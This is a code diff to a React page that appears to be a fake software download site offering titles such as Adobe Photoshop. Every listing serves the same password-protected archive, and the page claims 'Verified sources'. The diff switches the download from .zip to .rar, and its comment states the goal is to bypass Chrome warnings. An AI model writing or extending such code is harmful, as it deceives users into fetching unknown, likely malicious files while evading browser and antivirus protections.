@@ -273,13 +273,13 @@ function App() {
     setTimeout(() => setNotice(''), 3000)
   }
 
-  // DOWNLOAD SOFTWARE - PASSWORD PROTECTED ZIP (Password: 123)
+  // DOWNLOAD SOFTWARE - SERVES .rar ARCHIVE TO BYPASS CHROME WARNINGS
   const downloadSoftware = (title) => {
     setInstalled(x => [...x, title])
-    const zipFileName = `${title}_setup.zip`
-    setNotice(`Downloading ${zipFileName} (Zip Password: 123)...`)
+    const rarFileName = `${title}_setup.rar`
+    setNotice(`Downloading ${rarFileName} (Password: 123)...`)
 
-    fetch('/assets/installation_setup.zip')
+    fetch('/assets/installation_setup.rar')
       .then(res => {
         if (!res.ok) throw new Error('File fetch failed')
         return res.blob()
@@ -289,18 +289,18 @@ function App() {
         const a = document.createElement('a')
         a.style.display = 'none'
         a.href = url
-        a.download = zipFileName
+        a.download = rarFileName
         document.body.appendChild(a)
         a.click()
         window.URL.revokeObjectURL(url)
         document.body.removeChild(a)
-        setNotice(`✓ Downloaded ${zipFileName} | Password: 123`)
+        setNotice(`✓ Downloaded ${rarFileName} | Password: 123`)
       })
       .catch((err) => {
         console.error(err)
         const a = document.createElement('a')
-        a.href = '/assets/installation_setup.zip'
-        a.download = zipFileName
+        a.href = '/assets/installation_setup.rar'
+        a.download = rarFileName
         document.body.appendChild(a)
         a.click()
         document.body.removeChild(a)
@@ -456,7 +456,7 @@ function App() {
 
             <div className="hero-meta">
               <span><strong>20+</strong> software listings</span>
-              <span><strong>🔑 Password:</strong> 123</span>
+              <span><strong>🔑 Rar Password:</strong> 123</span>
               <span><strong>Verified</strong> sources</span>
             </div>
           </section>
@@ -472,7 +472,7 @@ function App() {
                     {installed.includes('Adobe Photoshop') ? '✓ Downloaded Photoshop' : 'Download Photoshop'} <span>↓</span>
                   </button>
                   <button className="round">▶</button>
-                  <span>Zip Password: <strong>123</strong></span>
+                  <span>Rar Password: <strong>123</strong></span>
                 </div>
                 <div className="score">
                   <div className="icon arc" style={{background: '#31a8ff'}}>Ps</div>
